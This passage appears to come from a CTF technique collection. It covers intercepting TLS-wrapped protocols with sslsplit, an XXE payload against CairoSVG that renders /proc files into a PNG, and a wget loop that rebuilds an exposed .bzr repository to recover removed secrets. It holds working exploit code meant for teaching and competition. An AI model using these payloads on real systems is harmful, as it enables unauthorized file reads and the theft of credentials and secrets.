**Key insight:** Clients without certificate pinning accept any CA-signed cert; sslsplit terminates TLS and forwards plaintext to its log, so any TLS-wrapped protocol (AMQP, IRC, MQTT, LDAPS, custom binary) becomes observable and — with a trivial mitmproxy patch — modifiable. Burp and mitmproxy focus on HTTPS; for arbitrary protocols, reach for sslsplit/sslsniff plus a pinhole in the TCP layer.

**References:** TAMUctf 2019 — Homework Help, writeup 13477

---

## CairoSVG XXE via Oversized width= (BSidesSF 2019)

**Pattern:** A web service renders user-supplied SVG to PNG with CairoSVG. CairoSVG (and librsvg/ImageMagick/rsvg-convert) resolves XML `DOCTYPE` entities before rasterising, so an XXE entity referenced inside `<text>` is drawn into the PNG. The gotcha: the rendered pixels have to fit the string — for a large file such as `/proc/self/status`, bump `width` up to ~20000 (max ~34000 before the server times out during rasterisation) so the text does not get clipped.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xx SYSTEM "file:///proc/self/status">]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx;; test</text>
</svg>
```

Upload, download the PNG, and read the flag off the image (eyeball or OCR). When hunting the flag path, dump `/proc/self/status` first to find the PID, then probe `/proc/<pid>/cwd/flag.txt`, `/proc/<pid>/cmdline`, and `/proc/<pid>/environ`. If the first pass clips (e.g. width=3000), re-render wider — BSidesSF 2019 SVGMagic landed the flag only at `width="3000"` because the target path was short.

**Key insight:** SVG renderers that honour DOCTYPE + ENTITY expansion are XXE-vulnerable just like any XML parser; enlarge `width` to fit large file contents into the rendered image, and remember the output channel is *pixels*, not text — `grep` the PNG for the flag after OCR (e.g. `tesseract img.png -`) or open it manually.

**References:** BSidesSF 2019 CTF — SVGMagic (PNGSVG), writeup 13711. See also the svglib variant in [server-side-2.md](server-side-2.md).

---

## Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)

**Pattern:** Web server exposes `/.bzr/` (HTTP 403 on the index, 200 on files). Bazaar stores history as a handful of index + pack files; `bzr check` tolerates partial repos and, on missing data, names the expected path in its error message. A loop that reads each error and `wget`s the corresponding file rebuilds the repository, after which `bzr revert` and `bzr diff` expose every committed revision — including secrets that were later removed.

```bash
# 1. Seed a local repo so bzr has a skeleton to work with
mkdir ctf && cd ctf && bzr init
echo foo > foo.txt && bzr add && bzr commit -m init && rm foo.txt

# 2. Replace the pointer files with copies from the victim
cd .bzr/branch     && rm last-revision && wget http://target/.bzr/branch/last-revision
cd ../checkout     && rm dirstate       && wget http://target/.bzr/checkout/dirstate
cd ../repository   && rm pack-names     && wget http://target/.bzr/repository/pack-names
cd ../../

# 3. Loop until bzr check stops complaining about missing indices/packs
while true; do
  OUT=$(bzr check 2>&1)
  [[ "$OUT" != *"No such file:"* ]] && break
  F=$(echo "$OUT" | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
  for EXT in cix iix rix six tix; do
    wget -P .bzr/repository/indices/ "http://target/.bzr/repository/indices/$F.$EXT"
  done
  wget -P .bzr/repository/packs/ "http://target/.bzr/repository/packs/$F.pack"
done
bzr revert

# 4. Mine every revision for interesting diffs
for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
```

**Key insight:** Exposed `.bzr/` (or `.git/`, `.hg/`, `.svn/`) directories leak full commit history; bzr is particularly friendly because it tolerates partial repos and reports the missing path verbatim, so a wget-in-a-loop solver finishes the job. Always diff revisions, not just `HEAD` — flags, wallet keys, and decryption keys are often *removed* in a later commit but still recoverable. Once the tree is reconstructed you can chain with challenges like STEM CTF "Medium is overrated", where revision N stores a base64 ciphertext and revision M stores the AES-ECB key.

**References:** STEM CTF Cyber Challenge 2019 — My First Blog & Medium is overrated, writeups 13380 and 13379
